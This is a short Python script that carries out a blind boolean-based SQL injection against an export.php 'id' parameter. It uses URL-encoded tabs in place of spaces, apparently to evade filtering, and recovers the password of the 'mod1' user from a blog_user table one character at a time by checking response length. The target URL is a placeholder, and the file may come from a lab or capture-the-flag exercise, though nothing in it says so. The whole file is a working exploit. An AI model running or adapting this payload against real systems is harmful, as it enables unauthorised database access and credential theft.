#!/usr/bin/env python3

import requests

count = 0
position = 1
result =[]
while True:
	for character in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
		url = "<CHANGE_THIS>/export.php?id="
		payload = f"1%09and%09(select%09substr((SELECT%09Password%09FROM%09blog_user%09WHERE%09Username%09%3D%09'mod1')%2C%09{position}%2C%091)%09%3D%09'{character}')%09;"
		r = requests.get(url + payload)
		if len(r.text) == 2266:
			print(f"character used: {character}")
			result.append(character)
			print("result: "+"".join(result)+"...")
			position += 1
			break
	count += 1
	if int(position) < int(count):
		print("FINAL RESULT: "+"".join(result))
		break